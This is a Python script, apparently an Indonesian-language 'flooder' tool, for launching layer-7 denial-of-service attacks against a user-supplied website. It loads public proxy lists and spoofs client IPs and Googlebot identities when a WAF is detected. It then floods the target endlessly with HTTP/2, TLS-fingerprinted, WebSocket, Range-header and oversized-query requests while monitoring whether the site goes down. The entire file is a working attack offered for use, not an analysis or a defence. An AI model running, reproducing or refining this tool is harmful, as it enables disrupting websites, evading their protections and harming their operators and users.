import requests, httpx, threading, random, string, time, socket, os, ssl, re
from tls_client import Session
from websocket import create_connection
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
from threading import Lock, Thread

TARGET_URL = input("🔗 URL Target (https://example.com): ").strip().rstrip("/")
MAX_THREADS = int(input("🧵 Jumlah Threads: "))
ENABLE_VIEW = input("👁️ Aktifkan Spam View? (y/n): ").strip().lower() == 'y'
USE_PROXY = input("🛡️ Gunakan Proxy? (y/n): ").strip().lower() == 'y'
ENABLE_RANDOM_QUERY = input("🔍 Gunakan Query Random 10jt huruf? (y/n): ").strip().lower() == 'y'

parsed = urlparse(TARGET_URL)
TARGET_DOMAIN = parsed.hostname
TARGET_IP = socket.gethostbyname(TARGET_DOMAIN)
TARGET_PORT = 443 if parsed.scheme == 'https' else 80
print(f"✅ Target IP: {TARGET_IP}:{TARGET_PORT}")

sukses = gagal = view_sent = total_req = 0
last_status_code = 0
target_status = "🟢 OKE"
spoof_mode = False
lock = Lock()
active_proxies = {}

USER_AGENTS = []
ua_file = "10k-user-agent.txt"
if not os.path.exists(ua_file):
    print("📥 File User-Agent belum ada, download otomatis...")
    try:
        import urllib.request
        urllib.request.urlretrieve(
            "https://raw.githubusercontent.com/Rizz9/10k-user-agent/refs/heads/main/user_agents.txt", ua_file
        )
        print("✅ Berhasil download 10k-user-agent.txt")
    except Exception as e:
        print(f"❌ Gagal download user-agent: {e}")
        USER_AGENTS = []

if os.path.exists(ua_file):
    with open(ua_file, "r") as f:
        USER_AGENTS = [ua.strip() for ua in f if ua.strip()]
    print(f"✅ Loaded {len(USER_AGENTS)} User-Agent")
else:
    print("⚠️ File 10k-user-agent.txt tidak ditemukan, pakai User-Agent default.")

PROXIES = []
def load_proxies():
    sources = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://openproxy.space/list/http",
        "https://multiproxy.org/txt_all/proxy.txt"
    ]
    print("🌐 Mengambil proxy...")
    for url in sources:
        try:
            r = requests.get(url, timeout=10)
            for p in r.text.splitlines():
                if re.match(r"\d+\.\d+\.\d+\.\d+:\d+", p.strip()):
                    PROXIES.append(p.strip())
        except Exception as e:
            print(f"⚠️ Gagal ambil dari {url}: {e}")
    print(f"✅ Total proxy dimuat tanpa validasi: {len(PROXIES)}")

if USE_PROXY:
    load_proxies()

def kotak(text):
    lines = text.strip().split("\n")
    panjang = max(len(line) for line in lines)
    bar = "═" * (panjang + 4)
    box = [f"╔{bar}╗"]
    for line in lines:
        box.append(f"║  {line.ljust(panjang)}  ║")
    box.append(f"╚{bar}╝")
    return "\n".join(box)

def gen_data():
    base = ''.join(random.choices(string.ascii_letters + string.digits, k=1024))
    padding = ''.join(random.choices(string.printable, k=random.randint(256, 512)))
    return base + padding

def normal_headers():
    ua = random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119"
    return {
        "User-Agent": ua,
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

def spoofed_headers():
    ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
    ua = random.choice(USER_AGENTS) if USER_AGENTS else "Googlebot/2.1 (+http://www.google.com/bot.html)"
    return {
        "User-Agent": ua,
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "CF-Connecting-IP": ip,
        "Referer": f"https://google.com/search?q={random.randint(1111,9999)}",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

def get_headers():
    return spoofed_headers() if spoof_mode else normal_headers()

def get_proxy():
    if USE_PROXY and PROXIES:
        proxy = random.choice(PROXIES)
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    return None

def detect_waf():
    global spoof_mode
    try:
        r = requests.get(f"{TARGET_URL}/?waf_check={random.randint(1111,9999)}", timeout=5)
        if r.status_code in [403, 405, 406]:
            spoof_mode = True
            print(f"🛡️ WAF terdeteksi ({r.status_code}) → Header spoofing aktif")
        else:
            print(f"✅ Tidak terdeteksi WAF (Status: {r.status_code})")
    except:
        print("⚠️ Gagal cek WAF")

def generate_random_query():
    return ''.join(random.choices(string.ascii_lowercase, k=10_000_000))

def attack_http2(proxy):
    global last_status_code, sukses, total_req, gagal
    try:
        with httpx.Client(http2=True, timeout=5, proxies=proxy) as client:
            r = client.get(f"{TARGET_URL}/?h2={random.randint(1000,9999)}", headers=get_headers())
            with lock:
                last_status_code = r.status_code
                sukses += 1
                total_req += 1
    except:
        with lock: gagal += 1

def attack_tls_client(proxy):
    global last_status_code, sukses, total_req, gagal
    try:
        sess = Session(client_identifier="chrome_120", proxy=proxy['http'] if proxy else None)
        sess.headers.update(get_headers())
        r = sess.get(f"{TARGET_URL}/?tls={random.randint(1000,9999)}", timeout=5)
        with lock:
            last_status_code = r.status_code
            sukses += 1
            total_req += 1
    except:
        with lock: gagal += 1

def attack_ws(proxy):
    global sukses, total_req, gagal
    try:
        ws_url = TARGET_URL.replace("https://", "wss://").replace("http://", "ws://")
        ws = create_connection(ws_url, timeout=5)
        ws.send(gen_data())
        with lock:
            sukses += 1
            total_req += 1
        ws.close()
    except:
        with lock: gagal += 1

def attack_l7_dual(proxy):
    global last_status_code, sukses, total_req, gagal
    try:
        method = random.choice(["GET", "POST", "HEAD"])
        headers = get_headers()
        url = f"{TARGET_URL}/?dual={random.randint(1000,9999)}"
        if method == "POST":
            r = requests.post(url, headers=headers, data={"data": gen_data()}, timeout=5, proxies=proxy)
        else:
            r = requests.request(method, url, headers=headers, timeout=5, proxies=proxy)
        with lock:
            last_status_code = r.status_code
            sukses += 1
            total_req += 1
    except:
        with lock: gagal += 1

def attack_range_header(proxy):
    global sukses, total_req, gagal
    try:
        headers = get_headers()
        headers["Range"] = f"bytes=0-{random.randint(100000,999999)}"
        r = requests.get(f"{TARGET_URL}/?range={random.randint(1000,9999)}", headers=headers, timeout=5, proxies=proxy)
        with lock:
            sukses += 1
            total_req += 1
    except:
        with lock: gagal += 1

def attack_fake_bot(proxy):
    global sukses, total_req, gagal
    try:
        headers = get_headers()
        headers["User-Agent"] = "Googlebot/2.1 (+http://www.google.com/bot.html)"
        headers["Referer"] = "https://www.google.com/"
        r = requests.get(f"{TARGET_URL}/?bot={random.randint(1000,9999)}", headers=headers, timeout=5, proxies=proxy)
        with lock:
            sukses += 1
            total_req += 1
    except:
        with lock: gagal += 1

def attack_fake_cdn_referer(proxy):
    global sukses, total_req, gagal
    try:
        headers = get_headers()
        headers["Referer"] = random.choice([
            "https://cdn.cloudflare.com/", "https://akamai.com/", "https://fastly.com/"
        ])
        r = requests.get(f"{TARGET_URL}/?cdn={random.randint(1000,9999)}", headers=headers, timeout=5, proxies=proxy)
        with lock:
            sukses += 1
            total_req += 1
    except:
        with lock: gagal += 1

def spam_view(proxy):
    global view_sent, total_req, gagal
    try:
        r = requests.get(f"{TARGET_URL}/?view={random.randint(100000,999999)}", headers=get_headers(), timeout=5, proxies=proxy)
        with lock:
            view_sent += 1
            total_req += 1
    except:
        with lock: gagal += 1

def attack_random_query(proxy):
    global sukses, total_req, gagal
    try:
        query = generate_random_query()
        url = f"{TARGET_URL}/search?q={query}"
        headers = {
            "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Referer": "https://www.google.com/",
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
        }
        r = requests.get(url, headers=headers, timeout=5, proxies=proxy)
        with lock:
            sukses += 1
            total_req += 1
    except:
        with lock: gagal += 1

def full_vector_loop(proxy):
    while True:
        attack_http2(proxy)
        attack_tls_client(proxy)
        attack_ws(proxy)
        attack_l7_dual(proxy)
        attack_range_header(proxy)
        attack_fake_bot(proxy)
        attack_fake_cdn_referer(proxy)
        if ENABLE_VIEW:
            spam_view(proxy)
        if ENABLE_RANDOM_QUERY:
            attack_random_query(proxy)

def cek_target_status():
    global target_status
    try:
        r = requests.get(TARGET_URL, timeout=3)
        target_status = "🔴 DOWN" if r.status_code >= 500 else "🟢 OKE"
    except:
        target_status = "🔴 DOWN"

def monitor():
    global sukses, gagal, view_sent, total_req
    ps = pv = 0
    while True:
        time.sleep(5)
        cek_target_status()
        with lock:
            ds = sukses - ps
            dv = view_sent - pv
            ps, pv = sukses, view_sent
            speed = ds // 5
            print(kotak(f"""
📊 L7: ✅ {sukses} ❌ {gagal} 👁️ {view_sent} (+{dv})
📿 CODE: {last_status_code} ⚡️ SPEED: {speed}/s
🔌 PORT: {TARGET_PORT} 📈 Total Req: {total_req}
🛁 STATUS: {target_status}
🌍 Proxy Aktif: {len(active_proxies)}
"""))

def main():
    os.system("clear")
    print(kotak("🔥 RIZZDEV FLOODER 2025 / THREAD LOOP MODE"))
    detect_waf()
    Thread(target=monitor, daemon=True).start()
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        for _ in range(MAX_THREADS):
            proxy = get_proxy()
            ex.submit(full_vector_loop, proxy)

if __name__ == "__main__":
    main()
